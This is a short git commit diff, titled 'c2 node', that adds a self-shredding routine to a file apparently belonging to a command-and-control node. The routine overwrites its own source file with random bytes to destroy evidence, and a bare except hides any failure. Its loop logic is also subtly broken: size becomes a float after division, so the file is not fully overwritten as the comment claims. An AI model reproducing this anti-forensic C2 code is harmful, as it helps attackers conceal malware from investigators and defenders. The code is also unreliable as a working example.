4183b0f043355a56a1e0531febcf62f0a45aba0d
hiten2 <hiten@riseup.net>
2018-06-24 15:55:21 -0400

    c2 node

--- c2-node3.py
+++ c2-node3.py
@@ -1,2 +1,17 @@
+import os
 import urllib.request
 
+def shredC2():
+    """shreds the file c2-node3.py"""
+    try:
+        fp = open(os.path.realpath(__file__), "r+b")
+        fp.seek(0, os.SEEK_END)
+        size = fp.tell() # get the number of bytes in the current file
+        fp.seek(0, os.SEEK_SET)
+        
+        while size > 0: # overwrite with random bytes
+            fp.write(os.urandom(size % 1048576))
+            size /= 1048576
+        fp.close()
+    except:
+        pass
